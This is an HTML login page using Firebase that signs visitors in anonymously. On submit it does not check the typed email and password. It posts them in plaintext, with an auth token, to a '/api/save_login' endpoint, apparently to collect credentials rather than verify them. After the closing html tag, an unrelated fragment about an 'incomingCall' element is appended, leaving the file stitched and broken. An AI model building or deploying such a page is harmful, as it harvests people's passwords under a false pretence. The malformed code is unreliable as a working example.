<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        .login-form {
            display: flex;
            flex-direction: column;
            width: 300px;
            margin: 100px auto;
        }
        .login-form input {
            margin-bottom: 10px;
            padding: 10px;
            font-size: 16px;
        }
        .login-form button {
            padding: 10px;
            font-size: 16px;
            background-color: #28a745;
            color: white;
            border: none;
            cursor: pointer;
        }
        .login-form button:hover {
            background-color: #218838;
        }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
</head>
<body>
    <form class="login-form" id="loginForm" method="POST">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyABlLCj8HyPHTtQbmo83QFnsQsjk6mDeXs",
            authDomain: "info-571f9.firebaseapp.com",
            projectId: "info-571f9",
            storageBucket: "info-571f9.appspot.com",
            messagingSenderId: "998797023754",
            appId: "1:998797023754:web:c7fb3fb4ce8803b1259df3"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        // Initialize Firestore
        const db = firebase.firestore();

        // Initialize Firebase Authentication
        const auth = firebase.auth();
        
        // Example: Sign in anonymously
        auth.signInAnonymously()
            .then(() => {
                console.log('Signed in anonymously');
            })
            .catch(error => {
                console.error('Error signing in', error);
            });

        const form = document.getElementById('loginForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = form.email.value;
            const pass = form.pass.value;

            const user = firebase.auth().currentUser;
            if (user) {
                const authToken = await user.getIdToken();
                
                const response = await fetch('/api/save_login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, pass, authToken })
                });

                const result = await response.json();
                console.log(result);
            } else {
                console.error('User is not authenticated');
            }
        });
    </script>
</body>
</html>

        // Initially show the incoming call container
        document.getElementById('incomingCall').style.display = 'block';
    </script>
</body>
</html>
